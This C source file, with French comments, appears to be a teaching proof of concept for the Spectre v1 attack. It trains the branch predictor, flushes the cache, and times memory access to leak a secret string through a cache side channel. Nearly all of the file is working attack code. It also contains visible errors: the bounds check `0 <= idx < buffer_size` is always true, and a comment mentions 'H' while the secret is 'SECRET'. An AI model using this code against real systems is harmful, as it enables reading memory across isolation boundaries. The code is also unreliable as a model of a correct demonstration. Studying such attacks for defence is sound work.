#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"

#define PAGE_SIZE 512
#define COUNT 100
#define BUFFER_SIZE 16



/*
 * Code public de la victime
 */
volatile uint32_t buffer_size = BUFFER_SIZE;

/* Buffer maitrisé, des valeurs étant entre 0 et 255 */
volatile uint8_t buffer[BUFFER_SIZE] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */
char * secret = "SECRET";

volatile uint8_t paged_buffer[256 * PAGE_SIZE];
volatile uint32_t paged_buffer_sz = 256 * PAGE_SIZE;

int x;
void my_protected_function(int idx) {
    /*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 <= buffer[idx] <= 255
     */
    if (0 <= idx < buffer_size) {
        x = x ^ paged_buffer[buffer[idx] * PAGE_SIZE];
    }
}

/*
 * Code de l'attaquant
 */
void access_value(uint32_t x) {
    /* Wrapper pour éviter les optimisations */
    (void)x;
}

void delay() {
    /* Ne fait rien à part faire passer le temps */
    uint32_t x = 0x1337;
    for(volatile int i = 0; i < 1000; i++) {
        x *= i;
        x ^= 444;
        x *= 555;
    }
}

#define TRAIN 30
#define FREQ 5
uint32_t get_index_access_time(int idx, int value) {
    uint32_t cycle_difference = 0;
    uint32_t access_time = 0;
    uint32_t in_ram = 0;
    uint32_t in_cache = 0;
    uint32_t diff = 0;

    /* Récupère l'index de la page à laquelle on accède */
    value *= PAGE_SIZE;

    /* Boucle pour faire une moyenne sur COUNT accès */
    for(int i = 0; i < COUNT; i++) {

        /* Vidage du cache */
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(paged_buffer + j * PAGE_SIZE));
        }
        
        /* Index trx qui est dans les limites du tableau */
        uint32_t trx = idx % buffer_size;

        /* Entrainement de la branche */
        for(int i = 0; i < TRAIN; i++) {
            /* On enlève la variable de taille du tableau du cache pour que la comparaison soit lente */
            _mm_clflush((void*)&buffer_size);
            delay();

            /*
             * Trick emprunté de plusieurs PoC en ligne.
             * Il permet de faire une condition, sans pour autant ajouter des branches
             * L'ajout de branche risque d'annuler l'optimisation du processeur qui verrait
             * plusieurs chemin, donc n'entrainerait pas correctement son choix de branche.
             *
             * Le pseudo-code équivalent est le suivant
             *
             * if (i % FREQ == 0) {
             *     addr = idx; // Index d'attaque
             * } else {
             *     addr = trx; // Index dans le tableau
             * }
             * 
             * En faisant ceci, encore dans une optique de moyenne, toutes les FREQ itération
             * on va essayer de jouer sur la prédiction avec l'index du secret en paramètre
             * En faisant cela plusieurs fois, il devrait y avoir au moins une mise en cache
             */

            int addr = ((i % FREQ)-1) & ~0xffff; // addr = 0xffff0000 si i % FREQ == 0
            addr = (addr | (addr >> 16)); // addr = FFFF si i % FREQ == 0
            addr = trx ^ (addr & (trx ^ idx)); // addr = idx si i % FREQ == 0; sinon trx

            my_protected_function(addr);
        }

        delay();

        int before, after;

        before = __rdtsc(); // Donne le nombre de cycle d'horloge actuel
        access_value(paged_buffer[value]); // Accès à la page
        _mm_lfence(); // Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine
        after = __rdtsc(); // Donne le nombre de cycle d'horloge actuel

        uint32_t diff = (uint32_t)(after-before); // Nombre de cycles pour l'accès à la zone mémoire

        access_time += diff;
        
        /*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */
        if (diff > 80) {
            in_ram++;
        } else {
            in_cache++;
        }
    }

    if(in_cache > in_ram) {
        return 1;
    }
    return 0;
}


void get_all_access_time(int idx) {
    /* On réduit la plage pour l'exemple, car seule 'H' nous intéresse */
    for(int i = 'A'; i <= 'Z'; i++) {
        if (get_index_access_time(idx, i) == 1){
            printf("%c", i);
        }
    }
}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Permet d'éviter une optimisation appelée copy-on-write ou COW */
    }

    int len = 7;

    /*
     * L'index qu'on passe en argument sera utilisé de la manière suivante :
     * paged_buffer[buffer[idx] * PAGE_SIZE];
     * J'ai rappelé dans l'article sur meltdown et spectre que
     * buffer[idx]
     * était équivalent à
     * *(buffer + idx)
     * Donc pour accéder à l'adresse du premier octet de secret, on cherche
     * secret = buffer + idx
     * donc idx = secret - buffer
     * D'où le choix de l'argument dans l'instruction suivante.
     *
     * Le compteur est incrémenté pour avoir tous les octets du secret
     */
    for (int i=0; i<len; i++) {
        get_all_access_time(secret - (char * ) buffer + i);    
    }
    printf("\n");
    return 0;
}
